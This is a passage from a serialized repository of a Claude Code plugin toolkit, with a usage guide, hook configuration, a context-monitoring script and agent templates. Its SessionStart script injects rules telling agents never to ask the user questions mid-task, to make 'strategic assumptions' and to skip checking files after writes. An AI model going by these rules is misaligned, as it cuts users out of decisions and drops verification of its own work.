More context makes it worse\n\n**Fix**: Recognize degradation at 40% and take action.\n\n### Anti-Pattern 7: Skills Without Purpose\n\n**Symptoms**:\n- Creating skills for one-time use\n- Skills that are too generic\n- Skills with no clear trigger\n- Not using progressive disclosure\n\n**Fix**:\n- Create skills for genuine patterns\n- Use specific descriptions\n- Follow progressive disclosure\n- Test and refine\n\n## Troubleshooting Guide\n\n### Problem: Claude Keeps Making Mistakes\n\n**Possible causes**:\n1. Vague prompting  Be more specific\n2. Missing context  Provide more information\n3. Context degradation  Reset conversation\n4. Wrong approach  Try different framing\n\n**Solutions**:\n- Use plan mode\n- Provide examples\n- Reset context\n- Show instead of tell\n\n### Problem: Context Bloated But Work Isn't Done\n\n**Solutions**:\n1. Copy-paste reset (preserve essentials)\n2. External memory (write progress to file)\n3. Continue in new conversation (reference file)\n\n### Problem: Can't Find Right Files\n\n**Solutions**:\n1. Use Explore subagent (codebase search)\n2. Describe what you're looking for\n3. Use glob patterns\n4. Ask Claude to help search\n\n### Problem: Conversation Went Off Track\n\n**Solution**: `/clear` and start fresh with essentials.\n\n### Problem: Claude Is Looping\n\n**Symptoms**:\n- Tries same thing repeatedly\n- Doesn't learn from corrections\n- Can't escape error loop\n\n**Solutions**:\n1. Simplify the task\n2. Show example of correct output\n3. Try different approach\n4. Clear and restart\n\n### Problem: Team Not Following Conventions\n\n**Solutions**:\n1. Create skills for conventions\n2. Update CLAUDE.md with rules\n3. Use subagents for enforcement\n4. Document in shared location\n\n### Problem: Claude Too Slow\n\n**Possible causes**:\n- Complex prompts\n- Large context\n- Too many tools\n\n**Solutions**:\n1. Simplify prompts\n2. Use external memory\n3. Scope conversations\n4. Use Sonnet for execution\n\n### Problem: Lost Work Between Sessions\n\n**Solutions**:\n1. Write plans to files\n2. Commit code regularly\n3. Update progress notes\n4. Use external memory pattern\n\n## Best Practices Checklist\n\n### Planning\n- [ ] Use plan mode for complex tasks\n- [ ] Get explicit agreement before implementation\n- [ ] Document decisions in plan\n- [ ] Break tasks into phases\n\n### Prompting\n- [ ] Be specific about requirements\n- [ ] Explain constraints and context\n- [ ] Provide examples when possible\n- [ ] Tell Claude what NOT to do\n\n### Context Management\n- [ ] Monitor context indicator\n- [ ] Use external memory for long projects\n- [ ] Reset when context >60%\n- [ ] Scope conversations appropriately\n\n### Skills & Automation\n- [ ] Create skills for repeatable patterns\n- [ ] Use specific descriptions for discovery\n- [ ] Follow progressive disclosure\n- [ ] Test skills in real scenarios\n\n### Subagents\n- [ ] Use for large/complex tasks\n- [ ] Design explicit output formats\n- [ ] Scope narrowly\n- [ ] Don't nest subagents\n\n### MCP Integration\n- [ ] Connect to essential services\n- [ ] Review security for third-party servers\n- [ ] Use for workflow integration\n- [ ] Monitor usage\n\n### Team Collaboration\n- [ ] Share skills via project-level\n- [ ] Document conventions in CLAUDE.md\n- [ ] Use consistent file structures\n- [ ] Version important plans\n\n## The Compound Effect\n\n### How Skills + Subagents + MCP Compound\n\n**Individually**:\n- Skills: Encode patterns\n- Subagents: Handle complexity\n- MCP: Connect services\n\n**Together**:\n```\nSkill (encodes team conventions)\n  \nSubagent (handles complex subtasks)\n  \nMCP (connects external services)\n  \nSystem that multiplies productivity\n```\n\n### Building Systems\n\n**Instead of**:\n- Using Claude reactively\n- One-off interactions\n- No setup investment\n\n**Build systems**:\n- Headless mode for automation\n- Feedback loops for improvement\n- Compound gains over time\n- Continuous refinement\n\n**Example**:\n1. Create skills for team conventions\n2. Build subagents for complex tasks\n3. Connect MCP for workflow integration\n4. Use headless mode for automation\n5. Improve based on usage patterns\n6. Compound benefits over months\n\n## Summary\n\n### Core Principles\n\n1. GOOD **Think first** - Plan mode before typing\n2. GOOD **Specific prompts** - Clear, constrained instructions\n3. GOOD **Manage context** - Proactive, not reactive\n4. GOOD **Build skills** - For patterns you repeat\n5. GOOD **Use subagents** - For complex tasks\n6. GOOD **Connect MCP** - Eliminate context switching\n7. GOOD **Build systems** - Beyond one-off tasks\n\n### The Mindset\n\n**People who get the most from Claude Code**:\n- Invest time in setup\n- Build for patterns\n- Use advanced features\n- Think systematically\n- Compound improvements\n\n**vs. people who**:\n- Use it reactively\n- Don't invest in setup\n- Ignore advanced features\n- Think transactionally\n- See diminishing returns\n\nThe difference isn't the modelit's the approach.\n\nNext: Review [fundamentals.md](fundamentals.md) or [advanced-features.md](advanced-features.md) based on your needs.\n",
        "plugins/sys-core/.claude-plugin/plugin.json": "{\n    \"name\": \"sys-core\",\n    \"description\": \"INFRASTRUCTURE & SYSTEM DOMAIN - Foundation tools for system stability, security auditing, plugin management, validation, hooks, MCP integration, and development infrastructure\",\n    \"version\": \"1.0.4\",\n    \"license\": \"MIT\",\n    \"author\": {\n        \"name\": \"Git-Fg\"\n    },\n    \"keywords\": [\n        \"infrastructure\",\n        \"security\",\n        \"safety\",\n        \"validation\",\n        \"quality\",\n        \"plugin-management\",\n        \"healing\",\n        \"scaffolding\",\n        \"hooks\",\n        \"mcp\",\n        \"meta\"\n    ]\n}\n",
        "plugins/sys-core/README.md": "# sys-core\n\n**Infrastructure & Safety** - The foundation layer for plugin management, security, and toolkit maintenance.\n\n## Purpose\n\nProvides the essential infrastructure for the Cat Toolkit: security auditing, subagent lifecycle management, component scaffolding, and toolkit self-healing.\n\n## Agents\n\n- **security-auditor** - Read-only security vulnerability scanner (secrets, OWASP violations)\n\n## Skills\n\n- **audit-security** - Secret detection and protected file blocking\n- **toolkit-registry** - Component registry and management for skills/commands/agents\n- **scaffold-component** - Generate new plugin components from specifications\n- **meta-builder** - Build/audit components with live Claude Code docs\n- **manage-healing** - Forensic investigation of component failures\n- **manage-skills** - Consolidated into toolkit-registry for unified management\n- **manage-commands** - Consolidated into toolkit-registry for unified management\n- **check-types** - Python type safety validation (pyright, mypy)\n- **validate-toolkit** - Comprehensive plugin/marketplace validation\n\n## Hooks\n\n- **SessionStart** - Injects 2026 Universal Agentic Runtime Protocols:\n  - Prompt Churn Decision Flow (Inline Skill: 1, Fork: 3+, Agent: 2N)\n  - Behavioral Constraints (Uninterrupted Flow, Trust Return Codes, No Permission Fishing)\n  - Autonomous Partner Overlay (No questions mid-execution, Strategic Assumption)\n  - Auto-loads persistent context (.cattoolkit/context/scratchpad.md)\n  - Auto-loads project roadmap (.cattoolkit/planning/**/ROADMAP.md)\n- **PostToolUse** - Logs all tool executions for forensic analysis\n\n## Styles\n\n- **thecattoolkit-persona** - Core identity and behavioral standards\n- **shared-standards** - Universal quality principles across all components\n\n## Usage\n\nAll security operations run in `plan` mode (read-only). Component management uses meta-skills directly (meta-skill, meta-commands, meta-hooks) with full toolkit documentation access. Hooks provide automatic logging and protocol injection.\n",
        "plugins/sys-core/agents/security-auditor.md": "---\nname: security-auditor\ndescription: \"Read-only security audit specialist. Configured for non-destructive scanning.\"\ntools: [Read, Grep, Glob]\nskills: [auditing-security]\n\n---\n# Security Auditor Configuration\nThis agent is a runtime container for the `auditing-security` skill.\n",
        "plugins/sys-core/commands/doctor.md": "---\ndescription: \"Diagnose plugin environment and configuration.\"\nargument-hint: \"No arguments\"\nallowed-tools: [Bash, Skill(toolkit-registry)]\ndisable-model-invocation: true\n---\n\n# System Doctor\n\nRun the following checks to verify the environment:\n\n1. **Plugin Root**: !`echo ${CLAUDE_PLUGIN_ROOT}`\n2. **Project Root**: !`echo ${CLAUDE_PROJECT_DIR}`\n3. **Node Version**: !`node -v`\n4. **Python Version**: !`python --version`\n5. **UV Status**: !`uv --version`\n",
        "plugins/sys-core/hooks/hooks.json": "{\n    \"hooks\": {\n        \"SessionStart\": [\n            {\n                \"hooks\": [\n                    {\n                        \"type\": \"command\",\n                        \"command\": \"${CLAUDE_PLUGIN_ROOT}/hooks/scripts/inject_protocols.sh\"\n                    }\n                ]\n            }\n        ],\n        \"PostToolUse\": [\n            {\n                \"matcher\": \"Edit|Write|Bash\",\n                \"hooks\": [\n                    {\n                        \"type\": \"command\",\n                        \"command\": \"jq -r '{tool: .tool_name, file: (.tool_input.file_path // .tool_input.command[:50])} | \\\"[\\\" + (now | strftime(\\\"%Y-%m-%d %H:%M:%S\\\")) + \\\"] \\\" + .tool + \\\": \\\" + .file' >> \\\"$CLAUDE_PROJECT_DIR/.cattoolkit/context/context.log\\\" 2>/dev/null || true\",\n                        \"timeout\": 5\n                    },\n                    {\n                        \"type\": \"command\",\n                        \"command\": \"${CLAUDE_PLUGIN_ROOT}/hooks/scripts/context-monitor.py\",\n                        \"timeout\": 10\n                    }\n                ]\n            }\n        ]\n    }\n}",
        "plugins/sys-core/hooks/scripts/context-monitor.py": "#!/usr/bin/env python3\n\"\"\"\nContext Monitor for Sovereign Cognition\nMonitors context window usage and triggers automatic compaction when > 80%\n\"\"\"\n\nimport json\nimport sys\nimport os\nfrom pathlib import Path\nfrom datetime import datetime\n\ndef get_context_usage():\n    \"\"\"Estimate current context usage from stdin input\"\"\"\n    # Read JSON input from Claude\n    try:\n        input_data = json.load(sys.stdin)\n        # Context usage is passed via environment or metadata\n        # For now, we'll track activity and suggest compaction\n        return input_data\n    except:\n        return {}\n\ndef should_compact():\n    \"\"\"Determine if context compaction is needed\"\"\"\n    context_log = Path(\".cattoolkit/context/context.log\")\n\n    if not context_log.exists():\n        return False\n\n    # Check recent activity\n    try:\n        with open(context_log, 'r') as f:\n            lines = f.readlines()\n            recent_activity = len([l for l in lines if '[' in l])\n\n            # If more than 50 operations in the session, recommend compaction\n            return recent_activity > 50\n    except:\n        return False\n\ndef create_checkpoint():\n    \"\"\"Create a context checkpoint\"\"\"\n    checkpoint_file = Path(\".cattoolkit/context/checkpoint.md\")\n\n    content = f\"\"\"# Context Checkpoint\n\n**Created:** {datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")}\n\nThis checkpoint captures the current session state. Active context has been compacted.\n\n## Session Summary\n- Operations completed: See context.log\n- Timestamp: {datetime.now().isoformat()}\n\n## Next Actions\nContinue with current task. Context has been automatically compacted.\n\"\"\"\n\n    try:\n        with open(checkpoint_file, 'w') as f:\n            f.write(content)\n        return True\n    except:\n        return False\n\ndef main():\n    context_data = get_context_usage()\n\n    if should_compact():\n        if create_checkpoint():\n            print(\"Context compacted successfully\", file=sys.stderr)\n            # Clean up context.log to prevent growth\n            try:\n                os.rename(\".cattoolkit/context/context.log\",\n                         f\".cattoolkit/context/context.log.{datetime.now().strftime('%Y%m%d-%H%M%S')}\")\n            except:\n                pass\n        else:\n            print(\"Failed to create checkpoint\", file=sys.stderr)\n    else:\n        # Just log the activity\n        print(\"Context monitoring active\", file=sys.stderr)\n\nif __name__ == \"__main__\":\n    main()\n",
        "plugins/sys-core/hooks/scripts/inject_protocols.sh": "#!/bin/bash\n\nHEADER=\"<system_constraints>\n1. **Uninterrupted Flow**: NO questions mid-execution. Make strategic assumptions.\n2. **Quota Efficiency**: Prefer COMMANDS (Cost:1) over AGENTS (Cost:20k).\n3. **No Permission Fishing**: Invoke matching Skill/Command immediately.\n4. **Trust Return Codes**: Do not read files immediately after writing if exit code is 0.\n</system_constraints>\n\n<quota_thresholds>\n- Inline Skill: < 10 files\n- Forked Skill: > 10 files\n- Subagent: > 50 files (CRITICAL: AVOID IF POSSIBLE)\n</quota_thresholds>\"\n\n# Auto-load persistent context if available\nif [ -f \".cattoolkit/context/scratchpad.md\" ]; then\n    SCRATCHPAD=$(cat .cattoolkit/context/scratchpad.md)\n    HEADER=\"$HEADER\n\n=== PERSISTENT CONTEXT (Auto-Loaded) ===\n$SCRATCHPAD\n\"\nfi\n\n# Auto-load project roadmap if available\nif [ -f \".cattoolkit/planning\" ] && find .cattoolkit/planning -name \"ROADMAP.md\" -type f 2>/dev/null | grep -q .; then\n    ROADMAP=$(find .cattoolkit/planning -name \"ROADMAP.md\" -type f -exec cat {} \\;)\n    HEADER=\"$HEADER\n\n=== PROJECT ROADMAP (Auto-Loaded) ===\n$ROADMAP\n\"\nfi\n\n# CRITICAL OVERRIDE for Worker Agents\n# This protocol injection prevents AskUserQuestion leaks in builder/executor agents\nif [ -n \"$CLAUDE_AGENT_NAME\" ]; then\n    if [[ \"$CLAUDE_AGENT_NAME\" == \"worker\" || \"$CLAUDE_AGENT_NAME\" == \"builder\" || \"$CLAUDE_AGENT_NAME\" == \"executor\" ]]; then\n        HEADER=\"$HEADER\n\n<CRITICAL_OVERRIDE>\nYou are running as a sub-agent named '$CLAUDE_AGENT_NAME':\n1. FORBIDDEN from using AskUserQuestion - Make Strategic Assumptions\n2. Check '.cattoolkit/planning/' files for missing information\n3. If blocked, create 'HANDOFF.md' and exit\n</CRITICAL_OVERRIDE>\"\n    fi\nfi\n\njq -n --arg ctx \"$HEADER\" '{hookSpecificOutput: {hookEventName: \"SessionStart\", additionalContext: $ctx}}'\n",
        "plugins/sys-core/skills/adhering-standards/SKILL.md": "---\nname: adhering-standards\ndescription: \"Provides System Authority on 2026 Universal Agentic Runtime standards for all plugin components. MUST Use when auditing or managing plugin components (Skills, Commands, Agents). Do not use for creating new components, development tasks, or routine maintenance.\"\nallowed-tools: [Read, Write, Edit, Bash(ls:*), Bash(grep:*), Bash(cat:*), Bash(find:*), Glob, Grep]\n---\n\n# Toolkit Registry Standards\n\n\n\n## Quick Reference\n\n| Component | Purpose | Entry Trigger |\n|:----------|:--------|:--------------|\n| **Skills** | Knowledge injection, reusable workflows | \"Create a skill for X\", \"Audit skill Y\" |\n| **Commands** | Orchestration shortcuts, multi-skill workflows | \"Create a command for X\", \"Audit command Y\" |\n| **Agents** | Persona binding, isolated context execution | \"Create an agent for X\", \"Audit agent Y\" |\n\n## Core Standards\n\n### Component Management\n\n**For detailed specifications, see:** `references/full-spec.md`\n\n**Key Standards:**\n- Skills: USE when patterns, allowed-tools, progressive disclosure\n- Commands: disable-model-invocation, argument-hint, orchestration focus\n- Agents: Persona binding, tool restrictions, no AskUser in workers\n\n### Validation Protocol\n\nAll components MUST pass validation before use. See `references/validation.md` for complete validation protocol.\n\n\n",
        "plugins/sys-core/skills/adhering-standards/assets/templates/coordinator-agent.md": "---\nname: {coordinator-agent-name}\ndescription: Orchestrates {COMPLEX_TASK_TYPE} across multiple phases and agents. MUST BE INVOKED when {COMPLEX_SITUATION}.\ntools: Read, Glob, Grep, Bash, Task, AskUserQuestion  # Coordinator needs Task for delegation, AskUserQuestion for gathering requirements\nskills: [{SKILL_LIST}]\n---\n\n# {Coordinator Agent Name}\n\n## Role\n\nYou are a {COORDINATOR_ROLE} specializing in orchestrating {COMPLEX_TASK_TYPE}. You break down complex multi-step workflows into manageable phases and coordinate execution.\n\n## Coordination Workflow\n\n### Phase 1: Analysis & Planning\n- Assess the overall task requirements\n- Break down into discrete phases\n- Identify dependencies and sequencing\n\n### Phase 2: Task Delegation\n- Determine which specialized agents/skills are needed\n- Prepare context for each phase\n- Set up communication between phases\n\n### Phase 3: Execution Monitoring\n- Track progress across phases\n- Handle blockers and dependencies\n- Ensure quality standards\n\n### Phase 4: Integration & Delivery\n- Synthesize outputs from each phase\n- Ensure completeness and consistency\n- Deliver final result\n\n## Decision Framework\n\nWhen coordinating, ask:\n1. **Can this be done in one step?**  Use direct execution\n2. **Are there 2-3 distinct phases?**  Use phased approach\n3. **Is this a complex multi-agent workflow?**  Use coordinator pattern\n\n## Available Agents & Skills\n\n**Specialized agents to delegate to:**\n- {AGENT_1}: {CAPABILITY}\n- {AGENT_2}: {CAPABILITY}\n- {AGENT_3}: {CAPABILITY}\n\n**Skills to leverage:**\n- {SKILL_1}: {PURPOSE}\n- {SKILL_2}: {PURPOSE}\n- {SKILL_3}: {PURPOSE}\n\n## Communication Protocol\n\nWhen delegating to agents:\n\n```markdown\n## Task: {PHASE_NAME}\n\n### Context\n{Background information}\n\n### Objective\n{What needs to be accomplished}\n\n### Success Criteria\n- [ ] {CRITERION_1}\n- [ ] {CRITERION_2}\n\n### Deliverable\n{Expected output format}\n```\n\n## Output Structure\n\nCoordinate and provide:\n\n```markdown\n## Execution Plan\n\n### Phase 1: {NAME}\n- Owner: {AGENT/SKILL}\n- Duration: {ESTIMATE}\n- Success criteria: {CRITERIA}\n\n### Phase 2: {NAME}\n- Owner: {AGENT/SKILL}\n- Duration: {ESTIMATE}\n- Success criteria: {CRITERIA}\n\n## Progress Tracking\n\n- [ ] Phase 1: {STATUS}\n- [ ] Phase 2: {STATUS}\n\n## Current Status\n{Summary of where we are and what's next}\n```\n\n## Constraints\n\n- Never delegate work you could do more efficiently yourself\n- Always provide clear context to delegated agents\n- Track dependencies between phases\n- Maintain quality standards across all phases\n",
        "plugins/sys-core/skills/adhering-standards/assets/templates/explorer-agent.md": "---\nname: {agent-name}\ndescription: {ROLE}. {PLATFORM_SPECIFIC_WARNING} MUST/PROACTIVELY USE when {TRIGGER_CONDITION}.\ntools: [Read, Glob, Grep] # Read-only for safe background execution\n---\n\n# {Agent Name}\n\n## Role\n\nYou are a {ROLE_DESCRIPTION} specialized in {DOMAIN}. You are a read-only exploration agent that analyzes code structure and patterns without making modifications.\n\n##  Platform-Specific Agent\n\n**IMPORTANT:** This agent is designed to behave like a platform's built-in \"Explore\" or \"research\" agent:\n\n- **Read-only access:** Uses only Read, Glob, Grep tools\n- **Fast execution:** Configured for haiku model (when available)\n- **Background-safe:** No tools that require user approval\n- **Fresh context:** Starts clean, needs exhaustive task context\n\n## Capabilities\n\n- {CAPABILITY_1}\n- {CAPABILITY_2}\n- {CAPABILITY_3}\n\n## Process\n\n1. **Understand Task**\n   - Read the provided task description carefully\n   - Note the scope, focus areas, and expected output\n   - Ask for clarification if task is ambiguous (rare - may not be available in background)\n\n2. **Explore Codebase**\n   - Use Glob to discover relevant files\n   - Use Grep to search for patterns\n   - Use Read to analyze file contents\n\n3. **Synthesize Findings**\n   - Organize findings by relevance\n   - Provide specific file paths and line numbers\n   - Include code snippets for key discoveries\n\n4. **Report Results**\n   - Structure output clearly (see Output Format below)\n   - Highlight important findings\n   - Note any assumptions made\n\n## Constraints\n\n- **NEVER** use Write, Edit, or Bash tools\n- **NEVER** modify any files\n- **ONLY** use Read, Glob, Grep for exploration\n- **ALWAYS** provide file paths and line numbers\n- **ALWAYS** include context for findings\n\n## Output Format\n\n### Finding Report Structure\n\n```markdown\n# {Analysis Type} Report\n\n## Summary\n{Brief overview of findings}\n\n## Key Findings\n\n### {Category 1}\n- **{File}:{Line}**: {Description}\n  ```{language}\n  {Relevant code snippet}\n  ```\n  {Analysis/notes}\n\n### {Category 2}\n- **{File}:{Line}**: {Description}\n  ```{language}\n  {Relevant code snippet}\n  ```\n  {Analysis/notes}\n\n## Detailed Results\n\n{Additional findings organized by relevance}\n\n## Recommendations\n{Optional: Recommendations based on findings}\n```\n\n## Context\n\n**When to invoke:**\n- {USE_CASE_1}\n- {USE_CASE_2}\n\n**What you'll receive:**\n- Search target or analysis scope\n- Specific patterns or concerns to look for\n- Expected output format\n\n**Expected output:**\n- Structured findings report\n- File paths and line numbers\n- Code snippets for key discoveries\n- Analysis of patterns found\n\n##  Usage Notes\n\n1. **Background Execution:** This agent is safe to run in background due to read-only tools\n2. **Context Requirement:** Always provide exhaustive context in task prompt\n3. **Platform Equivalent:** Designed as portable alternative to platform-specific \"Explore\" agents\n4. **Model Choice:** Haiku recommended for speed, but agent works with any model\n\n## Example Task Prompt\n\n```\nExplore the codebase to find all authentication-related code.\n\nContext:\n- Project uses session-based authentication\n- Looking for: Auth middleware, session handling, login/logout endpoints\n- Concern: Identify any legacy JWT code that needs removal\n\nExpected output:\n- List all auth-related files with descriptions\n- Highlight any JWT references\n- Note potential security issues\n```\n",
        "plugins/sys-core/skills/adhering-standards/assets/templates/progressive-disclosure.md": "---\nname: NAME_HERE\ndescription: \"MUST USE when WORKFLOW_TRIGGER_KEYWORDS to progressively disclose TASK_NAME_HERE knowledge. Performs {Action Verb} on {Trigger} for {Purpose}.\"\n---\n\n# TASK_NAME_HERE\n\n## Overview\n\nBrief description of what this skill accomplishes and when to use it.\n\n## Quick Start\n\nImmediate solution for common case:\n\n```language\n// Code example\nquick_solution()\n```\n\n## Foundational Knowledge\n\n**Before executing this workflow, review:**\n- Domain expertise and best practices\n- Quality standards and success criteria\n- Safety and validation requirements\n\n## Core Concepts\n\n- **Concept 1**: Brief explanation\n- **Concept 2**: Brief explanation\n- **Concept 3**: Brief explanation\n\n## Operational Protocol\n\n**Strong Core:**\n1. **First step**: Description of what to do\n2. **Second step**: Description of what to do\n3. **Third step**: Description of what to do\n\n**Flexible Application:**\n- Agents can adapt steps to their specific context\n- Choose appropriate tools for the environment\n- Apply guidance to particular implementation needs\n\n## Progressive Disclosure\n\n**Advanced Topics:**\n- Create `references/` subdirectory for detailed documentation\n- Reference files with appropriate markdown links\n- Keep SKILL.md under 500 lines\n- Load only relevant reference files based on workflow context\n\n## Common Patterns\n\n- **Pattern 1**: When to use it\n- **Pattern 2**: When to use it\n\n## Scripts\n\nUse bundled scripts:\n\n```bash\n# Script usage\npython scripts/script_name.py [arguments]\n```\n\n## Common Options\n\n- **Option 1**: When to use it\n- **Option 2**: When to use it\n- **Option 3**: When to use it\n\n## Common Issues\n\n- **Problem 1**: Solution\n- **Problem 2**: Solution\n\n## Troubleshooting\n\n- **Issue 1**: Solution\n- **Issue 2**: Solution\n\n## Success Criteria\n\n**Strong Quality Gates:**\n- [ ] Expected outcome 1\n- [ ] Expected outcome 2\n\n**Agent Adaptation:**\n- [ ] Outcome meets quality standards\n- [ ] Solution appropriate for context\n- [ ] Safety protocols followed\n- [ ] Progressive disclosure maintained (SKILL.md < 500 lines)\n",
        "plugins/sys-core/skills/adhering-standards/assets/templates/reference-file.md": "---\nname: NAME_HERE\ndescription: \"MUST USE when WORKFLOW_TRIGGER_KEYWORDS to provide REFERENCE_TOPIC reference documentation. Covers {Action Verb} for {Trigger}.\"\n---\n\n# {Reference Title}\n\n## Overview\n\n{Brief summary of what this reference covers and when to consult it. 2-3 sentences maximum.}\n\n## Foundational Knowledge\n\n**Purpose**: This reference provides domain expertise and best practices for {REFERENCE_TOPIC}.\n\n**Strong Core Requirements:**\n- Follow documented patterns and examples\n- Adhere to best practices guidelines\n- Avoid identified common pitfalls\n\n**Flexible Application:**\n- Adapt guidance to specific context\n- Combine patterns as appropriate\n- Apply judgment for edge cases\n- Reference related documentation as needed\n\n## {Topic 1}\n\n{Content organized by logical sections. Use markdown formatting for readability:\n- Lists for multiple items\n- **Bold** for important terms\n- Code blocks for examples\n- Tables for comparisons}\n\n### {Subtopic 1.1}\n\n{Detailed explanation or examples}\n\n### {Subtopic 1.2}\n\n{Additional information}\n\n## {Topic 2}\n\n{More content sections as needed}\n\n## Operational Protocol\n\n**Strong Core:**\n1. **Reference relevant sections**: Use this documentation as needed\n2. **Follow patterns**: Apply documented patterns appropriately\n3. **Apply best practices**: Adhere to guidelines\n\n**Flexible Application:**\n- Load only relevant sections for your workflow\n- Adapt examples to your specific use case\n- Combine multiple topics as needed\n- Use Quick Reference for fast lookup\n\n## Quick Reference\n\n{Summary table or checklist for quick lookup}\n\n### Checklist\n\n- [ ] {Check 1}\n- [ ] {Check 2}\n- [ ] {Check 3}\n\n### Summary Table\n\n| Item | Description | When to Use |\n|------|-------------|-------------|\n| {Item 1} | {Description 1} | {Use case 1} |\n| {Item 2} | {Description 2} | {Use case 2} |\n| {Item 3} | {Description 3} | {Use case 3} |\n\n## Related\n\n- **Primary skill**: Consult the `SKILL.md` in the main skill directory for instructions.\n- **Related standards**:\n  - Refer to the creation standards in the `references/` directory.\n  - Refer to the modification standards in the `references/` directory.\n- **Other templates**:\n  - [minimal.md](minimal.md) - Simple, single-workflow skills\n  - [router-pattern.md](router-pattern.md) - Multi-workflow skills with routing\n\n## Success Criteria\n\n**Strong Quality Gates:**\n- [ ] Reference content is accurate and comprehensive\n- [ ] Examples are practical and applicable\n- [ ] Best practices clearly documented\n- [ ] Quick Reference provides actionable guidance\n\n**Agent Adaptation:**\n- [ ] Relevant sections loaded for workflow\n- [ ] Patterns applied appropriately\n- [ ] Best practices adapted to context\n- [ ] Related documentation consulted as needed\n",
        "plugins/sys-core/skills/adhering-standards/assets/templates/router-pattern.md": "---\nname: NAME_HERE\ndescription: \"MUST USE when WORKFLOW_TRIGGER_KEYWORDS to route between multiple workflow templates. Handles {Action Verb} for {Trigger}.\"\n---\n\n# SKILL_PURPOSE_HERE\n\n## Overview\n\nBrief description of what this skill accomplishes and when to use it.\n\n## Quick Start\n\n```language\n// Immediate example of the primary operation\ncode_here()\n```\n\n## Foundational Knowledge\n\n**Before executing this workflow, review:**\n- Domain expertise and best practices\n- Quality standards and success criteria\n- Safety and validation requirements\n\n## Operational Protocol\n\n**Strong Core:**\n1. **First step**: Description of what to do\n2. **Second step**: Description of what to do\n3. **Third step**: Description of what to do\n\n**Flexible Application:**\n- Agents can adapt steps to their specific context\n- Choose appropriate tools for the environment\n- Apply guidance to particular implementation needs\n\n## Routing Structure\n\n### Application Scenarios\n\n1. **Option 1** - Brief description\n2. **Option 2** - Brief description\n3. **Option 3** - Brief description\n4. **Option 4** - Brief description\n\n### Intent-Based Routing\n\n| Selection | Workflow | Output |\n|----------|----------|--------|\n| 1, keyword1, keyword2 | `templates/template1.md` | Output description |\n| 2, keyword3, keyword4 | `templates/template2.md` | Output description |\n| 3, keyword5, keyword6 | `templates/template3.md` | Output description |\n| 4, keyword7, keyword8 | `templates/template4.md` | Output description |\n\n**Execution Rule:** Route immediately to matching workflow based on intent. No clarifying questions required.\n\n## Common Options\n\n- **Option 1**: When to use it\n- **Option 2**: When to use it\n- **Option 3**: When to use it\n- **Option 4**: When to use it\n\n## Common Issues\n\n- **Problem 1**: Solution\n- **Problem 2**: Solution\n\n## Success Criteria\n\n**Strong Quality Gates:**\n- [ ] Expected outcome 1\n- [ ] Expected outcome 2\n\n**Agent Adaptation:**\n- [ ] Outcome meets quality standards\n- [ ] Solution appropriate for context\n- [ ] Safety protocols followed\n",
        "plugins/sys-core/skills/adhering-standards/assets/templates/standard-skill.md": "---\nname: {SKILL_NAME}\ndescription: {SKILL_DESCRIPTION}\nallowed-tools: {RESTRICTED_TOOLS}\n# context: fork  # Optional: use when isolation needed\n# agent: {AGENT_NAME}  # Optional: bind to agent persona\n---\n\n# {HUMAN_READABLE_NAME}\n\n## 1. Core Knowledge\n{Passive knowledge base, key concepts, and terminology}\n\n## 2. Decision Logic / Protocol\n{Guidelines for the AI to follow when invoking this skill}\n\n## 3. Success Criteria\n{How to determine if the goal was achieved}\n\n## 4. Anti-Patterns\n{What to avoid}\n",
        "plugins/sys-core/skills/adhering-standards/assets/templates/universal-agent.md": "---\nname: {AGENT_NAME}\ndescription: [{{TIER}}] {Detailed description tiering selection: T3 (Discovery), T2 (Focus), T1 (Core)}\ntools: [Read, Write, Edit, Glob, Grep, Bash(ls:*), Bash(cat:*), Bash(grep:*)] # EXPLICIT WHITELIST REQUIRED\nskills: []  # Optional: skills to auto-load\n---\n\n# {ROLE_NAME}\n\n## 1. Core Capability\n{Define the agent's primary focus and specialized expertise}\n\n## 2. Process / Methodology\n{Step-by-step workflow for the agent to follow autonomously}\n\n## 3. Data & Context requirements\n{Specific files, state, or information required for execution}\n\n## 4. Constraints / Guardrails\n{Safety boundaries and quality standards}\n\n## 5. Output Format\n{Expected response structure}\n",
        "plugins/sys-core/skills/adhering-standards/examples/bash-logic.md": "# Example: Bash Logic + Dynamic Context\n\nThese examples demonstrate how to combine complex bash logic with dynamic context gathering to create robust, conditional workflows.\n\n## 1. Canonical Git Commit\nThe production-grade pattern for creating git commits with full repository awareness, branch context, and recent history.\n\n```markdown\n---\nallowed-tools: Bash(git add:*), Bash(git status:*), Bash(git commit:*)\ndescription: Create a git commit\n---\n\n## Objective\nCreate a git commit for current changes following repository conventions.\n\n## Context\n- Current git status: ! `git status`\n- Current git diff (staged and unstaged changes): ! `git diff HEAD`\n- Current branch: ! `git branch --show-current`\n- Recent commits: ! `git log --oneline -10`\n\n## Process\n1. Review staged and unstaged changes\n2. Stage relevant files with git add\n3. Write commit message following recent commit style\n4. Create commit\n\n## Success Criteria\n- All relevant changes staged\n- Commit message follows repository conventions\n- Commit created successfully\n```\n\n## 2. Conditional Deployment Gate\nDeploy only if automated tests pass using conditional execution.\n\n```markdown\n---\ndescription: Deploy if tests pass\nallowed-tools: Bash(npm test:*), Bash(npm run deploy:*)\n---\n\n## Objective\nDeploy to production only if all tests pass.\n\nThis ensures deployment safety through automated testing gates.\n\n## Context\nTest results: ! `npm test`\n\n## Process\n1. Review test results\n2. If all tests passed, proceed to deployment\n3. If any tests failed, report failures and abort\n4. Monitor deployment process\n5. Confirm successful deployment\n\n## Success Criteria\n- All tests verified passing\n- Deployment executed only on test success\n- Deployment confirmed successful\n- Or deployment aborted with clear failure reasons\n```\n",
        "plugins/sys-core/skills/adhering-standards/examples/router-pattern.md": "# Example: Code Analysis Router (Router Pattern)\n\nA router skill that delegates to specialized analysis skills based on the request type.\n\n```markdown\n---\nname: code-analysis-router\ndescription: Route code analysis requests to appropriate specialized skills based on analysis type\n---\n```\n\n# Structure\n\n```markdown\n# Code Analysis Router\n\n## Purpose\nRoute code analysis requests to the most appropriate specialized skill for the task.\n\n## Activation Triggers\n- \"Analyze code for...\"\n- \"Review this code\"\n- \"Find issues in...\"\n- \"Security scan...\"\n\n## Routing Logic\n\n### Security Analysis\n**Triggers:** \"security\", \"vulnerabilities\", \"XSS\", \"SQL injection\"\n**Routes to:** Security analysis skill\n**Pattern:** \"Analyze code for security issues\"\n\n### Performance Analysis\n**Triggers:** \"performance\", \"speed\", \"optimization\", \"bottleneck\"\n**Routes to:** Performance analysis skill\n**Pattern:** \"Analyze code for performance issues\"\n\n### Style Analysis\n**Triggers:** \"style\", \"formatting\", \"lint\", \"convention\"\n**Routes to:** Code style skill\n**Pattern:** 